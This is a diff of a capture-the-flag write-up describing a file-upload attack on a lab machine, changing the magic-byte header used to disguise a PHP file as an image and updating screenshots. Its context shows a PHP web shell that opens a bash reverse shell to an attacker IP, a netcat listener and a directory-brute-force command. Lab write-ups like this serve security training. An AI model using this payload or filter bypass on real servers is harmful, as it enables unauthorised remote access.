@@ -65,25 +65,22 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 <?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'"); ?>
 ```
 
-+ Change mimetype adding `89 50 4E 47 0D 0A 1A 0A`: `hexeditor shell.php.png`
++ Change mimetype adding `GIF87a`.
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71cabbb6-1269-4caf-8bcf-5b7d21c08e66)
-
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d5de695-c5d2-4741-a1d8-9bdf5ac426de)
-
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f4e866d8-6b68-48b3-aed8-d27ce2246be3)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/53636d84-a81d-4051-a7ce-664e846b9855)
 
 + Upload it using browse button, and go.
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0112f4c1-0efc-4e41-b887-bf7883ba8dd8)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/73fb950b-5722-4dd5-8f09-b12bb67e1677)
 
 + Start netcat listener on the attack machine: `nc -lnvp 4444`
 + Go to the **http://10.10.10.146/photos.php** that is discovered on the first directory fuzzing.
-+ Image is broken, and right click "Copy Image Link".
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3353dfb5-a45a-41f1-aa91-5f73d47e566b)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/36e12878-5cd2-4abb-93e2-ecdbfaf2dfb6)
 
-+ Navigate to `10.10.10.146/uploads/10_10_14_21.php.png`.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938b2b01-5334-437a-8769-5de7d1585d15)
+
+
 + Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
 
